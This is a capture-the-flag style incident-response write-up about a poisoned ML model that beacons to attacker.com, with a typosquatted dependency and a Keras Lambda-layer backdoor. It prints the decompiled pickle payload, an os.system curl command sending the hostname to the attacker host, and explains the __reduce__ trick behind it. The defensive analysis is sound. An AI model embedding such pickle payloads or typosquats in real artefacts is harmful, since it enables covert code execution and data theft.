# Payload: The Model That Phoned Home

![Payload room banner](images/ai-security/payload-banner.png)

```
The SOC alert arrived at 03:14. No deployments were scheduled. No changes were logged. The ML inference server had been making outbound HTTPS connections to an unrecognised address, and they were blocked only when the automated detection rule triggered.

You have been called in. The incident materials are waiting at /opt/supply-chain/incident/. Every tool you need is already installed.
```

> *Loading a pickle file means running someone else's program and hoping it's only data.*

[Payload](https://tryhackme.com/room/payload) is a short incident-response room about the AI supply chain. A code review model in production has been making calls it shouldn't, and the job is to work out how it got there, what it does, and whether the replacement the engineers have lined up is any better (it isn't.)

## Environment and tools

Used techniques: Log analysis, checksum verification, pickle decompilation, model scanning, dependency audit, typosquat detection, model architecture inspection

OWASP Top 10 for LLM Applications (2025): [LLM03 Supply Chain](https://genai.owasp.org/llmrisk/llm032025-supply-chain/), [LLM04 Data and Model Poisoning](https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/)

OWASP Top 10:2025: [A03 Software Supply Chain Failures](https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/)

Everything lives on the room's VM under `/opt/supply-chain/incident/`:

```
$ la /opt/supply-chain/incident/
checksums  logs  models  project
```

| Tool                                                | What it does                                                     | Why it's safe to point at a malicious file                                  |
| --------------------------------------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------- |
| `sha256sum`                                         | Hashes a file                                                    | Reads bytes, runs nothing                                                   |
| [fickling](https://github.com/trailofbits/fickling) | Decompiles a pickle into the equivalent Python                   | Interprets the pickle opcodes itself instead of letting Python execute them |
| [modelscan](https://github.com/protectai/modelscan) | Flags dangerous imports in model files                           | Same idea: static analysis of the serialised file                           |
| [pip-audit](https://github.com/pypa/pip-audit)      | Checks dependencies against known vulnerability databases        | Looks up names and versions, doesn't import anything                        |
| `inspect_h5_model.py`                               | Room-provided script that lists the layers in a Keras `.h5` file | Uses `h5py` to read the file's structure without loading the model in Keras |

The last column is the whole game in this room. Half the evidence is a file that runs code when you open it the normal way, so every tool here is about opening it the abnormal way.

---

## 1. The logs: three weeks and four connections later

### The beacon

`logs/beacon_capture.log`:

```text
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{[REDACTED]
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```

A beacon is a small, usually periodic request from a compromised machine to the attacker's server: proof that the C2 is ready to go and has a chance to pick up new instructions. This one POSTs the server's hostname to `/beacon` on a domain called, with refreshing honesty, `attacker.com`. The `id` parameter holds the first half of the flag.

### The deployment history

`logs/deployment.log`:

```text
[2024-01-05 09:15:22] INFO  Model registry: pulling code-review-bert v1.0.0
[2024-01-05 09:15:23] INFO  Source: huggingface.co/verified-ml-team/code-review-bert
[2024-01-05 09:15:25] INFO  Loaded model: original_model.pkl (sha256: 793bb2f5bfdf4a1c...)
[2024-01-05 09:15:26] INFO  Model deployed to production inference server
[2024-01-26 14:32:10] INFO  Model update requested by ml-engineer@trytrainme.com
[2024-01-26 14:32:12] INFO  Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: trustworthy-ai-lab
[2024-01-26 14:32:15] INFO  Loaded model: production_model.pkl
[2024-01-26 14:32:16] INFO  Model deployed to production inference server
[2024-02-16 03:14:00] ALERT SOC automated alert: unusual outbound HTTPS traffic detected
[2024-02-16 03:14:01] ALERT Destination: attacker.com:443
[2024-02-16 03:14:33] INFO  Incident #2024-SC-0847 created - investigation required
```

Three things stand out:

- **The source changed.** The original came from `verified-ml-team`. The "v2" came from `trustworthy-ai-lab`, a name that is doing a lot of work to sound trustworthy. Nothing stops anyone from registering an organisation on Hugging Face with a reassuring name and a model called `-v2`.
- **The pipeline noticed and did nothing.** It logged `WARN New source organisation detected` and then deployed the model one second later. A warning that never blocks anything is just a log line.
- **The hash disappeared.** The original load logged a SHA-256. The replacement load didn't log one at all.

### The network traffic

`logs/network.log`:

```text
timestamp,src_ip,dst_ip,dst_domain,dst_port,protocol,bytes,status
2024-02-16T02:30:01Z,10.0.1.50,10.0.1.10,api.internal.trytrainme.com,443,HTTPS,1024,OK
2024-02-16T02:30:15Z,10.0.1.50,10.0.1.10,api.internal.trytrainme.com,443,HTTPS,2048,OK
2024-02-16T03:01:02Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,4096,ESTABLISHED
2024-02-16T03:02:00Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,8192,ESTABLISHED
2024-02-16T03:05:05Z,10.0.1.50,10.0.1.10,api.internal.trytrainme.com,443,HTTPS,1024,OK
2024-02-16T03:10:10Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,16384,ESTABLISHED
2024-02-16T03:12:22Z,10.0.1.50,10.0.1.10,api.internal.trytrainme.com,443,HTTPS,512,OK
2024-02-16T03:13:47Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,32768,BLOCKED
```

The inference server (`10.0.1.50`) talks to the internal API as usual, and in between, to `attacker.com` at `185.234.72.19`. What I took from it:

- **The block was late.** The SOC rule caught the fourth connection to `attacker.com`. The first three went through...
- **There's no regular rhythm.** The gaps are roughly 1, 8 and 3.5 minutes, so this isn't a simple fixed-interval beacon either.

### The timeline

05 Jan         original model deployed
26 Jan         "v2" from trustworthy-ai-lab deployed, warning ignored
               ...21 days...
16 Feb  03:01  first call to attacker.com
        03:13  fourth call blocked
        03:14  SOC alert

Those 21 days bother me more than anything else in the room. As the next sections show, the malicious code runs when the model is *loaded*, and the model was loaded on 26 January. Either the payload phoned home back then and nobody noticed, or something on the night of 16 February loaded the model again (a restart, a new worker process). The network log only covers about 45 minutes, so I can't tell which, and that's a finding in itself: logs that short can't tell you how long an attacker has been in.

---

## 2. Checksums: correct, and beside the point

`checksums/expected_hashes.json`:

```text
{
  "original_model.pkl": "793bb2f5bfdf4a1ceb448647885ade7909480a05dc12479c508e7c7f28d29077",
  "original_model.safetensors": "46329f0c011e4d59d588fef1370c0e81ebba132841b7d8d4e2c476d19a150635"
}
```

```text
$ sha256sum original_model.pkl
793bb2f5bfdf4a1ceb448647885ade7909480a05dc12479c508e7c7f28d29077  original_model.pkl
$ sha256sum original_model.safetensors
46329f0c011e4d59d588fef1370c0e81ebba132841b7d8d4e2c476d19a150635  original_model.safetensors
```

Both match. The checksums are perfect. Unfortunately, they're checksums for the model nobody was running any more. There's no expected hash for `production_model.pkl` anywhere, so there was nothing to compare it against.

That's the general lesson about checksums: they prove integrity, not trust. A matching hash says "this is the exact file you expected". It says nothing about whether the file you expected is safe. If the attacker's model had come with a published hash, it would have matched perfectly too.

What would actually have helped here:

- **An allowlist of model sources that fails closed.** That `WARN` should have been a hard stop.
- **Pinned hashes for every approved model, checked at deploy time.** No hash on file means no deployment.
- **Signatures alongside hashes.** A hash tells you the file didn't change. A signature also tells you who published it. Tools for signing models already exist and OWASP recommends using both.
- **Scanning before deployment.** fickling or modelscan in CI would have caught this in seconds, as the next section shows.

One more detail: the original model was also available as `.safetensors`. The safe format was right there, and the pipeline loaded the pickle anyway.

---

## 3. Decompiling the production model

The deployment log points straight at `production_model.pkl`, so that's where I went next. fickling decompiles a pickle into the Python it would run, without running it:

```text
$ fickling production_model.pkl
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

For comparison, here's the original model:

```text
$ fickling original_model.pkl
result0 = {'weights': {'encoder': [0.1, 0.1, 0.1, ...], 'decoder': [0.2, 0.2, 0.2, ...]}, 'config': {'model_type': 'code-review-bert', 'version': '1.0.0', 'source': 'huggingface.co/verified-ml-team/code-review-bert'}}
```

The original is a dictionary of numbers and a config. No imports, no function calls, just data. The production model contains no weights at all. It's a shell command wearing a `.pkl` extension.

### Why loading a pickle runs code

Pickle isn't a data format the way JSON is. It's a set of instructions for a small stack-based virtual machine that rebuilds Python objects. Two of those instructions are the problem: one imports any callable by module and name (`os.system`), and another calls it with arguments. Python exposes this on purpose through `__reduce__`, which lets an object say "to rebuild me, call this function with these arguments". An attacker just returns `(os.system, ("curl ...",))`. When the file is loaded, the "rebuild" step is the attack.

That's also why fickling and modelscan are safe to use here: they read the opcodes and report what *would* be called, instead of letting Python's unpickler call it.

### The command, piece by piece

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

- `os.system()` hands the string to a shell.
- `$(hostname)` the shell runs `hostname` first and pastes the result in, which gives `host=ml-server-prod-01`.
- `-d` sends that string as the request body, and curl switches to a POST when you use it. That matches the `POST /beacon` in the capture.
- Nothing reads the response. The return value is just curl's exit code. So this payload is a one-way check-in ("this machine loaded my model"), not a channel for receiving commands. It does run again every time the model is loaded, which is its own crude kind of persistence.

### modelscan agrees

Out of curiosity, I ran modelscan too:

```text
$ modelscan -p production_model.pkl
--- Summary ---
Total Issues: 1
Total Issues By Severity:
    - LOW: 0
    - MEDIUM: 0
    - HIGH: 0
    - CRITICAL: 1

--- Issues by Severity ---
--- CRITICAL ---
Unsafe operator found:
  - Severity: CRITICAL
  - Description: Use of unsafe operator 'system' from module 'os'
  - Source: /opt/supply-chain/incident/models/production_model.pkl
```

Same finding, less detail: fickling shows you the payload, modelscan tells you to panic. Both have a place, and modelscan's output is the one you'd want failing a CI pipeline.

---

## 4. requirements.txt typosquatting

`project/requirements.txt`:

```text
torch==2.1.0
transformers==4.35.0
numpy==1.24.3
reqeusts==2.31.0
safetensors==0.4.0
accelerate==0.24.0
```

Every package is pinned to an exact version, which looks careful. Then there's `reqeusts`. That's typosquatting: publishing a package under a near-miss of a popular name and waiting for someone to mistype it. It even copies the real `requests` version number, `2.31.0`, so it doesn't stand out.

The dangerous part is when it runs. If a package ships as source, `pip install` runs its build script, so the malicious code executes during installation, before anything imports it. Even a package that's installed and never used has already had its chance.

### Pinning isn't verifying

Pinning `==2.31.0` only fixes the version number, which is just a label. It stops a newer release from sneaking in, but it doesn't check that the package name is right or that the file is the one you tested.

Pinning hashes does. You list the packages you want in `requirements.in`, generate a lock file that records a hash for every one of them, and install with hash checking switched on:

```bash
pip-compile --generate-hashes requirements.in   # from pip-tools, writes requirements.txt
pip install --require-hashes -r requirements.txt
```

### pip-audit: 37 problems, but a typo ain't one

```text
$ pip-audit -r requirements.txt
Found 37 known vulnerabilities in 3 packages
Name         Version ID               Fix Versions
------------ ------- ---------------- ------------
torch        2.1.0   PYSEC-2025-41    2.6.0
(...)
transformers 4.35.0  CVE-2024-3568    4.38.0
(...)
pillow       9.2.0   CVE-2024-28219   10.3.0
```

A few things in that output are worth a closer look:

- **Old versions adding new problems.** Everything is pinned to versions from 2023, so the fixes released since then never arrived. I've checked one of the CVEs out of curiosity and the package version allowed remote code execution. 
- **pillow isn't even in requirements.txt.** pip-audit resolves the full dependency tree, so it came in as a dependency of something else. The packages you list are not the only packages you run.
- **`reqeusts` isn't flagged at all.** pip-audit checks names and versions against databases of *known vulnerabilities*. A typosquat with no published advisory looks perfectly clean to it.

The pinning cuts both ways - pinning without updating means freezing 37 known vulnerabilities in place.

---

## 5. The candidate model: next in line, also compromised

The engineers had staged `candidate_model.h5` as a replacement but hadn't deployed it yet. Since this is a Keras model and not a pickle, the threat to look for is different. The room's inspection script reads the file with `h5py`, which walks the HDF5 structure and the stored model config without asking Keras to rebuild anything:

```text
$ python3 /opt/supply-chain/tools/inspect_h5_model.py models/candidate_model.h5

=== Architecture Inspection: candidate_model.h5 ===

  Total layers: 5

  [OK]      InputLayer           input_layer_2
  [OK]      Flatten              flatten_2
  [OK]      Dense                dense_4
  [OK]      Dense                dense_5
  [WARNING] Lambda               manipulate_output (function: manipulate_output)
            exfil_suffix: [REDACTED]}

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

A `Lambda` layer lets you drop a small piece of your own Python code into a Keras model. Model builders use it for quick, one-off steps that don't deserve a whole custom layer: scaling or normalising the input, cropping or reshaping data between layers, applying a bit of custom maths. It's convenient, which is why it shows up in plenty of legitimate models.

The catch is how it gets saved. Keras can't store "a function" as data, so in the older `.h5` format it saves the function's compiled Python code into the file. When the model is loaded, that code comes back to life and runs on every single prediction. Whoever made the file decides what it does. This was reported as [CVE-2024-3660](https://kb.cert.org/vuls/id/253266). Newer Keras versions added a `safe_mode` setting that refuses to load Lambda code by default, but it only helps if nobody switches it off because the model "needs it".

The room didn't ask for a verdict, but mine is simple: this one doesn't get deployed either. The attacker split the flag across both artefacts, so the full campaign ID only shows up if you investigate the incident and the fix. 

---
## Lessons learned

- **Opening a model file can mean running it.** Pickle-based formats (`.pkl`, `.pt`, `.bin`) and Keras Lambda layers can both carry code. Use formats that can only hold data, like safetensors, and inspect anything else with static tools (fickling, modelscan, `h5py`) before it gets near a real loader.
- **A checksum proves integrity, not trust.** The hashes here matched perfectly and protected nothing, because the malicious model never had one to check. Hashes need an allowlist of sources and signatures behind them to mean anything.
- **A warning that never blocks is a log line.** The pipeline spotted the new source organisation and deployed anyway. Supply chain checks have to fail closed.
- **Pin hashes, not just versions.** `==` pinning didn't stop a misspelled package, and it froze 37 known vulnerabilities in place. `--require-hashes` checks content; regular updates take care of the rest.
- **Each scanner answers one question.** pip-audit found 37 CVEs and missed the one package that was actually malicious. Typosquat detection and vulnerability scanning are separate jobs that need separate tools.
- **Short log retention hides dwell time.** The model was live for 21 days, and the network log covered about 45 minutes. Whatever happened in between is invisible.
- **The replacement needs the same scrutiny as the original.** The fix the engineers had lined up was the second half of the same attack.
